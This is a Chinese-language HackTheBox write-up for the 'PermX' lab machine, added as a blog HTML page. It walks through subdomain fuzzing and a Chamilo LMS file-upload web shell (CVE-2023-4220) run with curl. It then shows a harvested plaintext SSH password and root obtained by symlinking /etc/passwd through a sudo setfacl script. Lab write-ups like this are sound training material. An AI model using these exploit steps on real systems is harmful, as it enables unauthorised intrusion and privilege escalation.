@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P PermX這是一個簡單的機器，簡單的機器就一個CVE就G了一大半，所以沒什麼好說的。 0x1 Nmap1234567891011121314PORT   STATE S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - PermX">
+<meta property="og:url" content="https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P PermX這是一個簡單的機器，簡單的機器就一個CVE就G了一大半，所以沒什麼好說的。 0x1 Nmap1234567891011121314PORT   STATE S">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707041840-r9e571k.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707041854-imffdlv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707052152-9v3t8e0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707042602-lmbltis.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707042727-se69tg8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707043343-ob8d17n.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707043421-0qihixp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707044312-rbztv9g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707044417-vp78rdd.png">
+<meta property="article:published_time" content="2024-07-06T21:35:00.000Z">
+<meta property="article:modified_time" content="2024-11-03T21:08:32.796Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707041840-r9e571k.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - PermX</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/16/2024-htb-machine/28-Ghost/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/03/2024/0703-what-is-writeup-hash/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&text=HackTheBox - Machine - PermX"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&is_video=false&description=HackTheBox - Machine - PermX"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - PermX&body=Check out this article: https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&name=HackTheBox - Machine - PermX&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&t=HackTheBox - Machine - PermX"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - PermX
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-06T21:35:00.000Z" class="dt-published" itemprop="datePublished">2024-07-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="PermX"><a href="#PermX" class="headerlink" title="PermX"></a>PermX</h1><p>這是一個簡單的機器，簡單的機器就一個CVE就G了一大半，所以沒什麼好說的。</p>
+<h2 id="0x1-Nmap"><a href="#0x1-Nmap" class="headerlink" title="0x1 Nmap"></a>0x1 Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=</span><br><span class="line">|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://permx.htb</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>稍等一下只有80端口那肯定就是從80進去了。</p>
+<h2 id="0x2-80-web"><a href="#0x2-80-web" class="headerlink" title="0x2 80 - web"></a>0x2 80 - web</h2><p>輸入了IP地址之後它會跳轉到一個域名，所以使用這個域名去掃一下有沒有子域名， 可以看到有兩個結果。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ffuf <span class="literal">-w</span> /Tools/Wordlists/SecLists/Discovery/DNS/subdomains<span class="literal">-top1million-110000</span>.txt <span class="literal">-u</span>  http://permx.htb  <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.permx.htb&quot;</span>   <span class="literal">-fw</span> <span class="number">18</span></span><br><span class="line"></span><br><span class="line">www                     [<span class="type">Status</span>: <span class="number">200</span>, <span class="type">Size</span>: <span class="number">36182</span>, <span class="type">Words</span>: <span class="number">12829</span>, <span class="type">Lines</span>: <span class="number">587</span>, <span class="type">Duration</span>: <span class="number">72</span><span class="type">ms</span>]</span><br><span class="line">lms                     [<span class="type">Status</span>: <span class="number">200</span>, <span class="type">Size</span>: <span class="number">19347</span>, <span class="type">Words</span>: <span class="number">4910</span>, <span class="type">Lines</span>: <span class="number">353</span>, <span class="type">Duration</span>: <span class="number">908</span><span class="type">ms</span>]</span><br><span class="line">:: Progress: [<span class="number">114441</span>/<span class="number">114441</span>] :: Job [<span class="number">1</span>/<span class="number">1</span>] :: <span class="number">615</span> req/sec :: Duration: [<span class="number">0</span>:<span class="number">03</span>:<span class="number">09</span>] :: Errors: <span class="number">0</span> ::</span><br></pre></td></tr></table></figure>
+
+<p>其中， LMS這個域名特別感興趣， 他像某個框架所以就掃了一下它的子目錄， 然後發現他有個文檔</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707041840-r9e571k.png" alt="image">​</p>
+<p>打開那個文檔之後， 你可以看到它是1.11版本， 所以去網上查一下</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707041854-imffdlv.png" alt="image">​</p>
+<p>谷歌搜索 <code>chamilo lms 2023 cve</code>​，找到下面的幾個CVE：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-3368/">https://starlabs.sg/advisories/23/23-3368/</a></li>
+<li><a target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-4220/">https://starlabs.sg/advisories/23/23-4220/</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-4226">https://nvd.nist.gov/vuln/detail/CVE-2023-4226</a></li>
+</ul>
+<p>既然有三個差不多都是針對這個版本，那就一個一個試吧。 </p>
+<p><strong>嘗試第一個CVE</strong></p>
+<p>來到第一條連接，簡單看一下這個CVE，這個CVE的POC它會訪問一個鏈接，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707052152-9v3t8e0.png" alt="image">​</p>
+<p>那就手動訪問一下，但很明顯他告訴你禁止了，所以失敗。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707042602-lmbltis.png" alt="image">​</p>
+<p><strong>嘗試第二個CVE</strong></p>
+<blockquote>
+<p>On the attacker’s machine, run the following commands to create, upload and execute a PHP web shell:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span> &gt; rce.php</span><br><span class="line"><span class="variable">$</span> <span class="built_in">curl</span> <span class="operator">-F</span> <span class="string">&#x27;bigUploadFile=@rce.php&#x27;</span> <span class="string">&#x27;http://&lt;chamilo&gt;/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span></span><br><span class="line">The file has successfully been uploaded.</span><br><span class="line"><span class="variable">$</span> <span class="built_in">curl</span> <span class="string">&#x27;http://&lt;chamilo&gt;/main/inc/lib/javascript/bigupload/files/rce.php&#x27;</span></span><br><span class="line">uid=<span class="number">33</span>(www<span class="literal">-data</span>) gid=<span class="number">33</span>(www<span class="literal">-data</span>) groups=<span class="number">33</span>(www<span class="literal">-data</span>)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-4220/">https://starlabs.sg/advisories/23/23-4220/</a></p>
+</blockquote>
+<p>跟著CVE的內容去試一下，結果他成功了。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707042727-se69tg8.png" alt="image">​</p>
+<p>所以就shell了。</p>
+<h2 id="0x3-Shell-as-www-data"><a href="#0x3-Shell-as-www-data" class="headerlink" title="0x3 Shell as www-data"></a>0x3 Shell as www-data</h2><p>一上來我會直接翻一下數據庫，所以我要找到數據庫放在哪個文件</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707043343-ob8d17n.png" alt="image">​</p>
+<p>所以暴力搜索一下，可以看到，他在 <code>/app/config/configuration.php</code>​ 文件裡面，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707043421-0qihixp.png" alt="image">​</p>
+<p>然後就嘗試一下能不能連接SSH，所以需要找一下哪個用戶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@permx:/etc$ <span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">mtz:x:1000:1000:mtz:/home/mtz:/bin/bash</span><br><span class="line">www-data@permx:/etc$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-Shell-as-mtz-to-root"><a href="#0x4-Shell-as-mtz-to-root" class="headerlink" title="0x4 Shell as mtz to root"></a>0x4 Shell as mtz to root</h2><p>我看到有一個mtz的用戶，他的uid是1000，所以我就用他的用戶名試一下結果進去了，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mtz@10.129.28.60 : 03F6lY3uXAP2bkW8</span><br></pre></td></tr></table></figure>
+
+<p>然後就是簡單的看一下 <code>sudo -l</code>​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mtz@permx:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> mtz on permx:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User mtz may run the following commands on permx:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /opt/acl.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mtz@permx:~$ <span class="built_in">cat</span> /opt/acl.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 3 ]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Usage: <span class="variable">$0</span> user perm file&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">user=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">perm=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">target=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$target</span>&quot;</span> != /home/mtz/* || <span class="string">&quot;<span class="variable">$target</span>&quot;</span> == *..* ]]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Access denied.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the path is a file</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Target must be a file.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">/usr/bin/sudo /usr/bin/setfacl -m u:<span class="string">&quot;<span class="variable">$user</span>&quot;</span>:<span class="string">&quot;<span class="variable">$perm</span>&quot;</span> <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>結果是調用了 <code>setfacl</code>​，所以去gtfobins 搜一下，找到：</p>
+<blockquote>
+<h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><p>If the binary is allowed to run as superuser by <code>sudo</code>​, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_change</span><br><span class="line">USER=somebody</span><br><span class="line">sudo setfacl -m -u:$USER:rwx $LFILE</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/setfacl/">https://gtfobins.github.io/gtfobins/setfacl/</a></p>
+</blockquote>
+<p>這個腳本可以給當前用戶修改任意文件變成可寫，這樣就可以嘗試修改 passwd 文件，</p>
+<p>然而這個腳本限制了在<code>/home/mtz/*</code>​目錄下，那就嘗試製作一個軟連接，修改它的權限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mtz@permx:~$ <span class="built_in">ln</span> -s /etc/passwd mane</span><br><span class="line">mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/mane</span><br><span class="line">mtz@permx:~$ vim mane </span><br></pre></td></tr></table></figure>
+
+<p>結果成功的修改了裡面的內容：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707044312-rbztv9g.png" alt="image">​</p>
+<p>然後就直接su就得到root了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mtz@permx:~$ su mane</span><br><span class="line">Password: manemane</span><br></pre></td></tr></table></figure>
+
+<p>可以參考：<a target="_blank" rel="noopener" href="https://github.com/manesec/maketoolkit-db/blob/main/Notes/Linux/Edit%20passwd%20to%20login.md">https://github.com/manesec/maketoolkit-db/blob/main/Notes/Linux/Edit%20passwd%20to%20login.md</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/07-9xNFFY7Q42cNyyjt-PermX/image-20240707044417-vp78rdd.png" alt="image">​</p>
+<p>所以這臺機器沒什麼難度。</p>
+<p>最後你可以在它的腳本上看到，修改這四個文件一樣可以得到root，選一個修改就行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@permx:~<span class="comment"># cat reset.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">/usr/bin/cp /root/backup/passwd /etc/passwd</span><br><span class="line">/usr/bin/cp /root/backup/shadow /etc/shadow</span><br><span class="line">/usr/bin/cp /root/backup/sudoers /etc/sudoers</span><br><span class="line">/usr/bin/cp /root/backup/crontab /etc/crontab</span><br><span class="line">/usr/bin/setfacl -b /root/root.txt /etc/passwd /etc/shadow /etc/crontab /etc/sudoers</span><br><span class="line"></span><br><span class="line">/usr/bin/find /home/mtz -<span class="built_in">type</span> l ! -name <span class="string">&quot;user.txt&quot;</span> -mmin -3 -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+
